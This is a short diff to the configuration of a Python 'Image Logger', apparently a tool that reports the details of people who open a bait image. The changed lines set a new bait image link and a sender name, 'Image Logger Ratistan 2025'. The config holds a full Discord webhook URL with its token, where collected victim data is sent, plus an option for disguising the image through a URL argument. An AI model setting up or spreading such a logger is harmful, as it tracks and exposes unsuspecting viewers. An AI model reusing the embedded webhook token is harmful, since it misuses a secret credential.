@@ -13,12 +13,12 @@ __author__ = "Powni"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1356364653445517372/0Qlagy2RmnAsA6SiCTGNL8GAIiiiiTLDn92M3gmZfNg-L4Cbv44LP5prgKm3iNcLPoR_",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
+    "image": "https://www.google.com/url?sa=i&url=https%3A%2F%2Fwww.youtube.com%2F%40SonOyuncuNW&psig=AOvVaw3NxQSCVibBbci8Mp0pDOKy&ust=1743539744324000&source=images&cd=vfe&opi=89978449&ved=0CBQQjRxqFwoTCPid2OqVtYwDFQAAAAAdAAAAABAE", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "Image Logger Ratistan 2025", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
